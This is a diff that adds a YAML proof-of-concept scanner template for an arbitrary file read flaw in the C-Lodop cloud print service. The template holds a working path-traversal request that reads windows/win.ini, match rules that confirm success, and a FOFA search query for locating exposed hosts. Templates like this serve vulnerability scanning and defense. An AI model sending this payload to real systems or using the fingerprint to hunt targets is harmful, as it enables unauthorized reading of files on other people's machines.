@@ -1,0 +1,15 @@
+id: poc-yaml-C-lodop-anyfile-read
+info:
+  name: C-Lodop云服务 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: c-Lodop
+  fofa: body="C-Lodop" && icon_hash="-329747115"
+requests:
+- method: GET
+  path: /../../../../../../../../windows/win.ini
+  expression: "status_code == 200 && \ncontains(body,\"; for 16-bit app support\"\
+    ) &&\ncontains(body,\"[files]\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
